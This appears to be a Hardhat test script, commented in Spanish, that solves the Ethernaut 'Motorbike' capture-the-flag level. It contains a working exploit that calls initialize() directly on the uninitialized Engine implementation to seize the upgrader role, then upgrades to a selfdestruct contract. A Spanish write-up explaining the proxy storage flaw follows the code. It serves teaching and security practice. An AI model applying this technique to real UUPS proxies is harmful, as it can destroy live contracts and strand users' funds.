import chai, { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";
import { solidity } from "ethereum-waffle";

chai.use(solidity);

let accounts: Signer[];
let eoa: Signer;
let voltorb: Contract;
let motorbike: Contract;
let engine: Contract;
const LEVEL_ADDRESS = "0x58Ab506795EC0D3bFAE4448122afa4cDE51cfdd2";
const MOTORBIKE_INSTANCE: string = "0x4E953c48cAF79EA1F10FC9b5fAcE7e9df1B65a8d";
const ENGINE_INSTANCE: string = "0x0f257652a8Cb9fe7af8Ca7C1afea09B78840A664";
// const INSTANCIA_DEL_NIVEL: string = "";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Contrato del challenge
  const motorbikeFactory = await ethers.getContractFactory(`Motorbike`);
  const engineFactory = await ethers.getContractFactory(`Engine`);
  if (MOTORBIKE_INSTANCE.length > 1 && ENGINE_INSTANCE.length > 1) {
    motorbike = motorbikeFactory.attach(MOTORBIKE_INSTANCE);
    console.log(`INSTANCIA MOTORBIKE UTILIZADA DESDE:`, motorbike.address);
    engine = engineFactory.attach(ENGINE_INSTANCE);
    console.log(`INSTANCIA ENGINE UTILIZADA DESDE:`, engine.address);
  }
  else {
    const motorbikeAddress = await createChallenge(LEVEL_ADDRESS);
    motorbike = motorbikeFactory.attach(motorbikeAddress);
    console.log(`CONTRATO MOTORBIKE (PROXY) DEPLOYADO EN:`, motorbike.address);
    
    // Necesitamos conocer el address de la implemetanción. Lo obtenemos desde storage.
    let implementacion:string = ethers.utils.hexZeroPad(ethers.utils.hexValue(await ethers.provider.getStorageAt(motorbike.address,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")),20);
    
    // Continuamos como siempre
    engine = engineFactory.attach(implementacion);
    console.log(`CONTRATO ENGINE (IMPLEMENTACIÓN) DEPLOYADO EN:`, engine.address);
  }
  
  // Nuestro viejo y querido contrato Voltorb. Ejecutará una explosión (selfdestruct) en el contexto de la implementación Engine debido al delegatecall.
  const voltorbFactory = await ethers.getContractFactory(`Voltorb`);
  voltorb = await voltorbFactory.deploy();
  await voltorb.deployed();
  console.log(`CONTRATO VOLTORB DEPLOYADO EN:`, voltorb.address);
});

describe("Motorbike challenge", async()=> {
  it("Motorbike proxy e implementación Engine funcionando bien", async()=>{  
    // En caso que no tengamos el address de la implementación (posible de obtener en Etherscan --> Ver imagenes), podemos obtener el address analizando el storage del proxy.
    let implementacion:string = ethers.utils.hexZeroPad(ethers.utils.hexValue(await ethers.provider.getStorageAt(motorbike.address,"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")),20);
    console.log("El slot reservado al address de la implementación vale: ", implementacion);
    
    //Vemos quién es el upgrader asignado.
    let upgrader = await ethers.provider.getStorageAt(motorbike.address,0);
    console.log("El upgrader de Engine es: ", upgrader);

    // Ya que estamos chequeamos que el valor del horsePower sea 1000 en la implementación.
    console.log(`El valor de horsePower en el Engine es de: ${BigNumber.from(await ethers.provider.getStorageAt(motorbike.address,1))}`);   
  })

  it("Destrucción del Engine realizada con éxito", async()=>{
    //Encodear función explosion para enviar en msg.data a utilizar en fallback del proxy.
    const iface = new Interface(["function explosion(address payable contractAddress)"]);
    const data = iface.encodeFunctionData("explosion", [await eoa.getAddress()]);

    let txInitialize = await engine.initialize();
    await txInitialize.wait();
    
    //Enviar transacción para ser tomada por fallback. Uso sendTransaction para enviar cualquier verdura (sería la sección "CALLDATA" en Remix que aparee abajo de todas las funciones de un contrato).
    let txParaSelfDestruct = await engine.upgradeToAndCall(voltorb.address, data, {gasLimit: 1e5});
    await txParaSelfDestruct.wait();
  });
});

after(async () => {
  expect(await submitLevel(motorbike.address), "DESAFÍO INCOMPLETO").to.be.true;
});   


/*

Lectura:
Existen 2 contratos en este desafío: Motorbike (proxy) y Engine (implementación). Ambos respetan la idea del patrón UUPS, donde el mecanismo para actualizar la implementación se encuentra en la misma (en este caso Engine) y no en el propio proxy.
Al inicializarse Engine, la address del proxy es establecida como upgrader.
Existe un método que se llama upgradeToAndCall. Si hace lo que dice el nombre, es algo digno de revisar para explotar posibles vulnerabilidades.

Ideas:
Si enviamos una petición de upgrade al proxy (Motorbike), el mismo la derivará a la implementación (Engine). Entonces hay que revisar el mecanismo de upgradeability en Engine.
El método upgradeToAndCall podría ser vulnerado para cambiar la dirección de implementación, pero tiene un control "authorizeUpgrade" ¿Cómo se puede cambiar el upgrader?

Explicación:
Hay que tener bien en claro qué storage se está utilizando. En esta situación, cuando se inicializó el contrato Engine se lo hizo desde el constructor de Motorbike, entonces: ¿En qué storage se estableció al upgrader?

Al tener nuestros primeros roces con proxies, podríamos confundirnos y pensar "Oh, el control _authorizeUpgrade es un poco inservible, ya que si solicitamos al proxy que haga un "updateToAndCall", lo derivará a la implementación y msg.sender será Motorbike (no nosotros)". Pero hay un problema grave con esto: El storage utilizado por ambos contratos reside en el proxy, y él sabe que nosotros no somos el upgrader.

Entonces... ¿Cómo hacemos para cambiar el upgrader? Bueno, si bien la idea del proxy es interactuar con la implementación a través de él, también podríamos saltearlo y hablar directo con Engine, ¿no?
Si entonces invocaramos directamente al método initialize() de Engine (el cual se encuentra con initialized=false dentro de su storage --> que no es el del proxy), podríamos cambiar el upgrader y después decir lo que todes queremos: "Voltorb yo te elijo!".


RECORDATORIO: ES POSIBLE QUE NO FUNCIONE DENTRO DE ESTE ENTORNO. CREAR UN PROYECTO NUEVO HARDHAT Y PROBAR ALLÍ CON LOS CONTRATOS DE OPENZEPELLIN ACTUALIZADOS PARA LA VERSIÓN CORRESPONDIENTE.
*/